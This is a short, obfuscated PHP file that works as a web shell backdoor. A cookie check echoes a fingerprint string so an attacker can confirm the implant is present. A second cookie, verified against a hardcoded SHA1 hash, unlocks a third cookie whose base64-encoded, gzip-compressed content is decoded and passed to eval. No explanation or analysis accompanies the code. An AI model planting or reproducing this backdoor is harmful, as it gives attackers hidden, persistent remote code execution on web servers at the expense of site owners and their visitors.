<?php

$ehhdrsdsw = 'btdgsvcx1xgc';
$dvnskch = "6633d413b635a5cf4a0f1dbc6ab7a375df2c7e91";

if (isset($_COOKIE[$ehhdrsdsw])) {
    exit($ehhdrsdsw . $dvnskch . $ehhdrsdsw);
}

$ausdbhfc = @$_COOKIE[substr($dvnskch, 0, 16)];
$ausdbhfc = sha1($ausdbhfc);

$gzasfsd = "gzinflate";

if ($ausdbhfc === $dvnskch)
{
    $kbdvjgcf = $_COOKIE[substr($dvnskch, 16, 16)];

    $dvnskch = base64_decode($kbdvjgcf);

    $dvnskch = $gzasfsd($dvnskch);

    if (!empty($dvnskch))
    {
        eval($dvnskch);
    }
}
exit();


